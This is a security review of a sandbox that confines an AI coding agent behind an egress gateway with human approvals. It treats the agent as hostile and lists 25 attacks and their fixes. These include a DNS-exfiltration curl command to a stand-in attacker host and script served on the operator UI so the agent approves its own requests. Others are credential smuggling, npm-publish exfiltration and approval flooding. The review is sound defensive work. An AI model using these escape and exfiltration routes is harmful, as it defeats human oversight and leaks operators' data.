# Security review 2026-11 (v0.1.0 → v0.2.0)

- **Scope:** all code and configuration in this repository at v0.1.0: egress gateway (`gateway/`),
  control plane (`control/`), agent image (`agent/`), Compose stack, setup script, CI, documentation.
- **Method:** manual source review against the [threat model](threat-model.md), with the agent treated as
  **fully hostile** (prompt-injected or malicious code running as the agent user with full control over every
  process, port and byte it emits). Each finding was reproduced or reasoned through to a concrete attack,
  then fixed with a regression test where testable.
- **Result:** 25 findings: 1 critical, 6 high, 11 medium, 7 low. **All fixed in v0.2.0.** The remaining
  risks are accepted and documented [below](#accepted-risks).

Severity scale: **Critical**: the agent gains control of the operator plane or fully escapes the policy.
**High**: a security boundary is bypassed or weakened in a realistic setup. **Medium**: an exploitable
weakness that needs extra conditions, or defence in depth with a concrete attack. **Low**: hardening or
hygiene.

## Summary

| ID | Sev. | Component | Finding | Fix | Regression test |
|---|---|---|---|---|---|
| TG-01 | **Critical** | control | Agent-controlled HTML/JS served on the UI origin through the console proxy | Console page served by control; filtered WebSocket relay only | `test_console_page_is_served_by_control_not_the_agent`, `test_web_console_roundtrip` |
| TG-02 | High | gateway | DNS exfiltration: names resolved before the policy decision | Name-first evaluation ([ADR-0011](adr/0011-decide-on-names-before-resolving.md)) | `test_denied_names_are_never_resolved`, `test_unknown_names_are_asked_before_resolution`, unit `test_name_first_evaluation` |
| TG-03 | High | gateway | Hard-deny list replaceable at runtime via API/UI | Immutable floor from read-only config; API adds only | `test_hard_deny_floor_is_not_editable_via_api`, unit `test_hard_deny_floor_cannot_be_removed_via_policy` |
| TG-04 | High | gateway | "Always (*.domain)" widened to shared public suffixes (`*.github.io`, `*.ngrok-free.app`) | Public Suffix List incl. private section; refuse for suffixes; show pattern | unit `test_domain_scope_respects_private_public_suffixes` |
| TG-05 | High | gateway | Agent's own `Authorization`/`Cookie` forwarded to injection hosts | Always strip on inject hosts; fail closed without secret | `test_agent_credentials_never_reach_injection_hosts` |
| TG-06 | High | control | Telegram approvals open to every member of a group chat when no user allowlist is set | Allowlist mandatory | `test_telegram_without_allowed_users_is_disabled` |
| TG-07 | High | control | `TRUST_PROXY_AUTH_HEADER` / `X-Forwarded-*` believed from any peer | `TRUSTED_PROXIES` required | `test_forged_cookie_and_proxy_header_are_rejected` |
| TG-08 | Medium | gateway | Unlimited concurrent approval prompts (prompt flooding, alert fatigue) | `max_pending` cap | `test_pending_approvals_are_capped` |
| TG-09 | Medium | gateway | Event log grows without bound (disk fill, unusable live log) | Coalescing of identical events + row cap | `test_identical_events_are_coalesced` |
| TG-10 | Medium | gateway, UI | Unvalidated agent-chosen hostnames in prompts (look-alikes, homographs, garbage) | Strict syntax; domain + IDN warning shown | `test_invalid_hostnames_are_refused`, `test_punycode_names_are_flagged_in_prompts`, unit `test_hostname_validation` |
| TG-11 | Medium | gateway | Baseline policy permits `npm publish` (exfiltration with an attacker's npm token) | `readonly` hosts | `test_readonly_hosts_refuse_writes` |
| TG-12 | Medium | control | Stateless session cookie: logout did not end the session; no idle timeout | Server-side sessions, idle + absolute expiry | `test_logout_invalidates_the_session_server_side` |
| TG-13 | Medium | control | Weak scrypt cost (N = 2^14); rate limit only per IP; unbounded tracking | N = 2^16, globally serialised checks, bounded state | manual (see below) |
| TG-14 | Medium | control | UI binds `0.0.0.0` (incl. agent-net) when `CONTROL_BIND_HOST` is unset | Mandatory, fail closed | code review |
| TG-15 | Medium | gateway | `allow_private` service exception honoured on every proxy mode | Bound to reverse mode + exact target | unit `test_service_exception_only_in_reverse_mode` |
| TG-16 | Medium | compose | IPv6 link-local (`fe80::`) addresses on internal networks | IPv6 disabled by sysctl in all containers | `bypass.sh` |
| TG-17 | Medium | control | Unbounded reads of agent responses (status JSON, WebSocket frames) → control OOM | Size limits | code review |
| TG-18 | Medium | agent | GitHub CLI apt key fetched without fingerprint verification | Pinned fingerprint (rotated 2026 key) | image build |
| TG-19 | Low | gateway | mitmproxy onboarding app (`mitm.it`) answers outside the policy | `onboarding=false` | code review |
| TG-20 | Low | gateway | Secret values not validated (CR/LF → header injection) | Printable only, ≤ 8 KiB; 0600 enforced | `test_secret_with_crlf_is_rejected`, unit test |
| TG-21 | Low | control | Origin check ignored the scheme; no `Cache-Control`, COOP, `frame-ancestors` | Full-origin check (PUBLIC_URL), extra headers, CSP everywhere | `test_security_headers`, `test_cross_origin_login_is_refused` |
| TG-22 | Low | setup | `.env` briefly world-readable during creation | `umask 077` | code review |
| TG-23 | Low | repo | Personal values in example config and tests | Replaced with neutral examples | code review |
| TG-24 | Low | control | Notifier state unbounded; bot token could appear in logs | Expiry-based pruning, no reuse of open short ids, token redaction | code review |
| TG-25 | Low | control | Open redirect via `Location` passed through from the agent's ttyd | Gone with TG-01 (no HTTP relay) | covered by TG-01 tests |

## Findings

### TG-01 (Critical): agent-controlled script on the control UI origin

**Where:** `control/app/main.py` `term_proxy` (v0.1.0).
**Problem:** `/term/<name>/…` reverse-proxied **all HTTP** to the agent's ttyd, under the UI's origin, with
CSP and `X-Frame-Options` explicitly switched off for that path. ttyd runs as the agent user, so a hostile
agent can kill it and listen on 7681–7683 itself.
**Attack:** the agent serves `<script>` at `/term/bash/`. When the operator opens the console tab, the
script runs with the operator's session on the UI origin. It can pass the CSRF check (same origin, custom
header), approve its own pending requests, replace the policy with `default: allow`, and remove
hard-deny entries (TG-03). It could also serve a fake login page or exfiltrate approvals.
**Fix:** control serves `term.html` and `term.js` itself, using xterm.js vendored with checksums
(`control/app/static/vendor/SHA256SUMS`). Only the ttyd WebSocket (`/term/<name>/ws`) is relayed, and it is
filtered:
- Browser → agent: the size handshake is rebuilt by control, which adds the credential. After that only
  input (`0`) and resize (`1`) frames pass.
- Agent → browser: only terminal output (`0`). Title and preference messages, which ttyd can use to push
  client options, are dropped.
- Frames are size-limited, and the console closes when the session ends.

No HTTP response from the agent ever reaches the browser. A strict CSP (`default-src 'none'; script-src
'self'`) now applies to every page, and OSC 8 links in terminal output are inert. See
[ADR-0009 (revised)](adr/0009-web-console-via-ttyd-and-tmux.md).

### TG-02 (High): DNS exfiltration through the gateway's resolver

**Where:** `gateway/egressgw/core.py` `server_connect` (v0.1.0) resolved the name, then decided.
**Attack:** `curl -x gw:3128 https://$(base32 secret).attacker.example/`: the gateway's resolver asks the
attacker's authoritative server. The connection is denied, or waits for an approval that never comes, but
the data has already left, and the operator only sees "denied". This bypassed ADR-0006, which closes only
the agent's *own* DNS.
**Fix:** two-phase evaluation ([ADR-0011](adr/0011-decide-on-names-before-resolving.md)). Rules and the
default are evaluated on the name alone first. `deny` means the name is never resolved; `ask` means the
human is asked before any lookup. Only allowed names are resolved and then checked against the hard deny
on every resolved IP. CIDR allow/ask rules placed above host rules still force a lookup; this is documented.

### TG-03 (High): hard-deny list editable at runtime

**Where:** `PUT /policy` accepted any `hard_deny`, including `[]`; the UI offered a textarea for it.
**Attack:** anyone holding the UI session (see TG-01) or the gateway token sets `hard_deny: []` with an
allow rule, and the agent reaches the LAN, the Docker host and cloud metadata.
**Fix:** `Policy.hard_deny_floor` comes only from `hard_deny_floor` in the read-only mounted
`config/gateway.yaml` (default: the built-in list). `policy.yaml` and the API can only **add** CIDRs. The
UI shows the floor read-only. The built-in list gained `192.0.2.0/24`, `198.51.100.0/24`, `203.0.113.0/24`,
`192.88.99.0/24`, `::/96`, NAT64 (`64:ff9b::/96`, `64:ff9b:1::/48`), `100::/64`, Teredo (`2001::/32`),
`2001:db8::/32`, 6to4 (`2002::/16`) and `fec0::/10`. The tunnelling prefixes matter because they embed
(possibly private) IPv4 addresses.

### TG-04 (High): domain approvals covering other tenants

**Where:** `registrable_domain()` used a ten-entry list of two-level suffixes.
**Attack:** the agent requests `x.attacker.github.io` (or `*.ngrok-free.app`, `*.s3.amazonaws.com`,
`*.vercel.app` …). The operator clicks "Always (*.domain)" thinking of GitHub, and every user's pages on
that platform are now permanently allowed, including the attacker's.
**Fix:** the Public Suffix List with its **private** section (`publicsuffixlist`, bundled snapshot, no
runtime download). `foo.github.io` widens to `*.foo.github.io`. Widening is refused for public suffixes and
IPs: the button is hidden and the API returns 400. Every button shows the exact pattern.

### TG-05 (High): the agent's own credentials on injection hosts

**Where:** `request` hook; "secret not configured: leave request as-is".
**Attack:** before the operator stores a token, or at any time via `Cookie`, the agent sends its own
`Authorization: token <attacker PAT>` or a `user_session` cookie to `github.com` / `api.github.com`. It can
then push to the attacker's repositories, create gists, and so on: a clean exfiltration channel through a
host that the baseline allows.
**Fix:** on injection hosts the configured header and `inject_strip_headers` (default `Authorization`,
`Cookie`) are always removed. Without a secret the request goes out without credentials. Injected requests
can now only act as the operator's token.

### TG-06 (High): Telegram approvals without a user allowlist

**Where:** `TELEGRAM_ALLOWED_USER_IDS` was optional ("Empty = anyone in the chat").
**Attack:** with a group chat, any member (or anyone a member adds) presses "Always (*.domain)".
**Fix:** without the allowlist Telegram approvals are disabled, with an error log. This matches Matrix.

### TG-07 (High): header-based trust from arbitrary peers

**Where:** `read_session` (proxy auth header) and the login rate limit / origin check (`X-Forwarded-*`).
**Attack:** if port 8080 is reachable other than through the proxy (for example `CONTROL_PUBLISH=0.0.0.0:8080`,
or another container on the host), `Remote-User: admin` authenticates without a password. Spoofed
`X-Forwarded-For` values defeat the per-IP login limit.
**Fix:** the new `TRUSTED_PROXIES` (CIDRs). Forwarded and auth headers are honoured only from those peers,
and `TRUST_PROXY_AUTH_HEADER` refuses to start without `TRUSTED_PROXIES`.

### TG-08 (Medium): approval flooding

The agent could open hundreds of distinct pending requests: UI cards, Telegram messages and Matrix posts,
each holding a socket. That is a denial of service on the human, and alert fatigue makes a wrong click
likely. **Fix:** `max_pending` (default 10). Beyond it, new unknown destinations are denied immediately and
logged.

### TG-09 (Medium): log flooding

Every DNS query and every denied attempt was a SQLite row with only age-based pruning (30 days), so a loop
fills the disk and buries real events. **Fix:** identical events (same kind, proto, client, host, port,
action, reason) within 2 s are counted, not stored, and summarised as "(repeated N×)". There is also a hard
row cap (`log_max_events`, default 500 000).

### TG-10 (Medium): untrusted names in human prompts

Names were not validated, so prompts could show any string the proxy accepted, including look-alikes such
as `github.com.evil.example` and punycode homographs. **Fix:** strict DNS syntax. Names must be ASCII
letters, digits, `-` or `_`, with labels of at most 63 characters and at most 253 characters in total;
anything else is denied before DNS or a prompt. IDNs, which mitmproxy hands over decoded, are normalised
back to punycode, so rules and prompts never show homograph Unicode. Prompts in the UI, Telegram and Matrix
show the registrable domain separately and flag `xn--` names.

### TG-11 (Medium): package registry as an exfiltration path

`registry.npmjs.org` is allowed by the baseline. `npm publish` (a PUT) with an attacker's npm token
uploads arbitrary data. **Fix:** `readonly` hosts. TLS is intercepted (the agent already trusts the gateway
CA) and `PUT`, `PATCH` and `DELETE` get a 403. The default config marks `registry.npmjs.org` read-only.
`POST` stays allowed for `npm audit`; uploads to PyPI go to `upload.pypi.org`, which the baseline does not
allow.

### TG-12 (Medium): sessions could not be revoked

The HMAC cookie (`user|expiry|sig`) stayed valid for 12 h after logout and could be replayed from any copy.
**Fix:** server-side session store with a random 256-bit id, signed in the cookie. Logout and restart
invalidate sessions. There is an idle timeout (`SESSION_IDLE`, 2 h) plus the absolute TTL. Logout is
origin-checked.

### TG-13 (Medium): password hashing and brute force

scrypt with N = 2^14 is below current guidance, and the limit was per IP only, so address spraying worked.
**Fix:** the new hash format `scrypt:16:<salt>:<hash>` (N = 2^16, 64 MiB); the legacy format is still
accepted. Checks run in a thread under a global lock with a 1 s failure penalty, so there is about one guess
per second **in total**. Failure tracking is bounded, `hashpw.py` enforces at least 12 characters, and a
warning is logged when the plain `CONTROL_PASSWORD` is used. Verified manually: correct, wrong, legacy and
malformed hashes.

### TG-14 (Medium): fail-open bind address

`main()` defaulted to `0.0.0.0`, and control is attached to `agent-net`. A missing variable would therefore
have put the UI where the agent can reach it. **Fix:** `CONTROL_BIND_HOST` is mandatory.

### TG-15 (Medium): service exceptions on every path

`allow_private` exempted the service's target from the hard deny for **any** mode: CONNECT and SOCKS to the
same target worked too, and the host match was a glob. **Fix:** the exception applies only in `reverse`
mode, with an exact host and port.

### TG-16 (Medium): IPv6 link-local

`enable_ipv6: false` does not stop the kernel from configuring `fe80::` addresses on container interfaces
when the host has IPv6 enabled. That gives an L2 path to every peer's IPv6 listeners. ttyd and the status
server bind to all addresses. **Fix:** the sysctls `net.ipv6.conf.{all,default}.disable_ipv6=1` in all
three containers, now checked by `bypass.sh`.

### TG-17 (Medium): trusting agent response sizes

`api_agent` read the whole JSON response, and the WebSocket relay had `max_msg_size=0` (unlimited). The
agent could exhaust control's 256 MiB limit. **Fix:** responses from the agent are capped at 1 MiB, frames
from the browser at 64 KiB, and the status reply must be a JSON object.

### TG-18 (Medium): unpinned repository key

The GitHub CLI keyring was trusted on first download. **Fix:** the build fails unless the keyring contains
the pinned fingerprint `7F38 BBB5 9D06 4DBC B3D8 4D72 5612 B364 6231 3325`. That is GitHub's replacement
key; the older `2C61…6059` expired on 2026-09-05.

### TG-19 to TG-25 (Low)

- **TG-19:** mitmproxy's onboarding app answered `http://mitm.it` before any policy check. It is now
  disabled.
- **TG-20:** secret values reach HTTP headers, so CR/LF would allow header injection or request smuggling
  upstream. Values must now be printable and at most 8 KiB, and the secrets file is chmod 0600 at startup.
- **TG-21:** the origin comparison ignored the scheme. It now compares the full origin against
  `PUBLIC_URL`, or against the trusted forwarded values. New headers: `Cache-Control: no-store` for the API
  and pages, COOP/CORP, `Permissions-Policy`, and CSP `frame-ancestors`/`base-uri`/`form-action`. Login
  also gets an origin check.
- **TG-22:** `setup.sh` copied `.env.example` with the default umask before writing secrets into it. It now
  runs with `umask 077`.
- **TG-23:** `RC_NAME` in `.env.example` and a test hostname used personal domains. Both are now neutral.
- **TG-24:** notifier maps grew when a "resolved" event was missed, and short ids could be reused while
  still open. Entries are now pruned 5 min after expiry, open ids are never reused, and the bot token is
  redacted from poll errors.
- **TG-25:** ttyd's `Location` header was passed to the browser. It is gone with TG-01.

## Accepted risks

These are documented in the [threat model](threat-model.md#residual-risks) and are not fixable within this
design:

| Risk | Rationale |
|---|---|
| Exfiltration via the Anthropic API | The agent must hold its own Claude credentials for Remote Control. It can therefore also call `api.anthropic.com` with an API key it chooses. Every comparable sandbox shares this. |
| Exfiltration within allowed hosts/token scope | An allowlist cannot inspect intent. Keep the lists tight, use fine-grained PATs, review the log. |
| Shared kernel | Explicit design choice (container isolation, not a VM). For more isolation, run the stack in a dedicated VM or use gVisor. |
| Agent self-test can lie | It is a setup aid. `bypass.sh` with an independent probe container is authoritative. |
| xterm.js parses agent output | Vendored and pinned, no clipboard or link addons, strict CSP. Update deliberately. |
| Matrix homeserver admins | They can act as allowed users, and the room is not end-to-end encrypted. Use your own homeserver. |

## Considered and rejected

- **Name constraints on the gateway CA:** only the agent trusts the CA, and an attacker with the CA key
  already needs a man-in-the-middle position between the agent and the gateway. mitmproxy also adds the
  pinned IP as a SAN, so an IP-constrained CA would break interception. The cost outweighs the benefit; the
  CA key stays in `state/gateway/` (mode 700).
- **Pinning base images by digest:** tags plus Dependabot keep images patched. Digest pinning trades that
  for reproducibility. Operators who want it can pin in `compose.override.yaml`.
- **Strict per-request approvals ("once" = a single connection):** tools open several connections per
  operation, and a 2-minute rule avoids prompt storms (TG-08). The label states the time.

## Verification

- `make lint`: ruff and shellcheck clean.
- `make test`: unit and end-to-end suites, 64 tests, of which 22 are new regression tests for this review.
- Browser check (Chromium, Playwright) of every UI tab and the new console under the strict CSP. This
  caught two problems in the first version of the fixes before release:
  - `Referrer-Policy: no-referrer` made Chromium send `Origin: null` on the login form, so the new origin
    check refused valid logins. Changed to `same-origin`.
  - IDN names were refused instead of flagged (see TG-10).
- `tests/integration/bypass.sh` (CI): new checks for IPv6 being disabled in all containers, the gateway's
  link-local address, and unknown names being held rather than connected.
